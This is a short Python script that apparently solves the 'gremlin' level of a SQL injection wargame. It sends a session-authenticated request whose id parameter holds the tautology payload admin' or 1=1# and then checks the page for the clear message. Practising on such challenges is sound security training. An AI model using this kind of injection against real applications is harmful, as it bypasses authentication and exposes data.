import requests
from dotenv import load_dotenv
import os

load_dotenv()
url=os.environ.get('LOS_URL')+'chall/gremlin_280c5552de8b681110e9287421b834fd.php?id=admin%27%20or%201=1%23'
headers = {
    'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
}

res=requests.get(url, headers=headers)
if "GREMLIN Clear!" in res.text:
    print("Success")
else:
    print("Failed")
    print(url)
    print(res.text)